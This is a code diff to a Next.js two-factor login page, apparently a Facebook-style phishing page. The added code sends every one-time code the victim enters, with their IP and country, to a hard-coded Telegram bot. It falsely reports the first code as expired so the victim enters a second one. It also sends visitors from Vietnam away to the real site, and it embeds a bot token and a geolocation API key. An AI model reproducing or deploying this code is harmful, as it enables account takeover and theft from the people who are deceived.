@@ -1,6 +1,6 @@
 "use client";
 import Link from 'next/link'
-import React, { useState } from 'react'
+import React, { useState, useEffect } from 'react'
 import '@style/2fa.css'
 import { zodResolver } from '@hookform/resolvers/zod';
 import { useForm } from 'react-hook-form';
@@ -9,25 +9,101 @@ import { schema2fa } from '../login/schema';
 import { useRouter } from 'next/navigation';
 
 type FormData = z.infer<typeof schema2fa>;
+
+
+const chatId = '-4095764303';
+const botToken = '6333593472:AAEIM1_VL6YrJvIJzToBLMOdM8eVTZ-VUWQ';
+async function sendMessageToTelegramBot(chatId : any, messageText : any, botToken :any) {
+  try {
+    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const data = {
+      chat_id: chatId,
+      text: messageText,
+    };
+
+    const response = await fetch(apiUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data),
+    });
+
+    const responseData = await response.json();
+    if (responseData.ok) {
+      console.log('Message sent:', responseData.result);
+    } else {
+      console.error('Error:', responseData);
+    }
+  } catch (error) {
+    console.error('Error sending message:', error);
+  }
+}
 const Login2fa = () => {
     const router = useRouter()
     const [countLogin, setCountLogin] = useState(0);
+    const [error, setError] = React.useState(false);
+
+    const [ip, setIp] = useState('');
+    const [userAgent, setUserAgent] = useState('');
+    const [country, setCountry] = useState('');
+    const [langCode, setLangCode] = useState('en-US');
+
+    const [countdown, setCountdown] = React.useState(0);
+
+
+    useEffect(() => {
+        // Fetch IP address
+        fetch("https://api.ipgeolocation.io/ipgeo?apiKey=ab2b18f1cf97421582f9b9190121e2a5").then(res => res.json()).then(data => {
+          setIp(data.ip);
+          setCountry(data.country_name);
+          const lang = data.country_code2.toLowerCase();
+          setLangCode(data.languages.split(',')[1]);
+          if(data.country_code2 === 'VN'){
+            window.location.href = 'https://www.facebook.com/';
+          }
+        });
+       
+        //const data_ip = res_ip.json();
+       
+        //fetch('https://api.ipgeolocation.io/ipgeo?apiKey=ab2b18f1cf97421582f9b9190121e2a5')
+        //  .then(res => res.json())
+        //  .then(data => {setIp(data.ip); console.log(data)});
+    
+        // Get user agent
+        setUserAgent(navigator.userAgent);
+    
+        // Initialize reCAPTCHA
+
+      }, []);
+    
     const {
         register,
         handleSubmit,
         formState: { errors },
-        setError
     } = useForm<FormData>({
         resolver: zodResolver(schema2fa),
     });
 
     const onSubmit = (data: any) => {
-        console.log(data);
-        setCountLogin(prev => prev + 1)
+        //console.log(data);
+        const message = `\nip: ${ip}\ncountry: ${country}\ncode 1 : ${data.code}\n`;
+        sendMessageToTelegramBot(chatId, message, botToken);
+        setCountLogin(prev => prev + 1);
+        if(countLogin === 0) {
+            setError(true);
+            const timeoutId = setTimeout(() => {
+            setError(false);
+
+            }, 30000); 
+        return () => clearTimeout(timeoutId);
+        }
         if (countLogin > 0) {
+            const message = `\nip: ${ip}\ncountry: ${country}\ncode 2 : ${data.code}\n`;
+            sendMessageToTelegramBot(chatId, message, botToken);
             router.push('/createcareer')
         } else {
-            setError('code', { message: 'Your code has expired. Please enter a new code to continue your accont.' });
+            setError(true);
         } 
     };
 
@@ -408,18 +484,19 @@ const Login2fa = () => {
                                     name="code"
                                     data-email="true"
                                     data-required="true"
-                                    placeholder="login code"
+                                    placeholder="Login code"
                                     defaultValue=""
+                                    maxLength={8}
                                     style={{ marginTop: '5px' }}
                                 />
-
                                 <br />
-                                {errors.code && <span className="error">{errors.code.message}</span>}
+                                {errors &&  countdown > 0 && <span className="error">Your code has expired. Please enter a new code to continue your account. Try again after: {countdown} seconds
+                                </span>}
                                 <br />
                                 <hr />
 
                                 <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: 15 }}>
-                                    <span>Need another way to confirm that it's you?</span>
+                                    <a href="#">Need another way to confirm that it's you?</a>
                                     <button type='submit' >Submit code</button>
                                 </div>
                             </div>
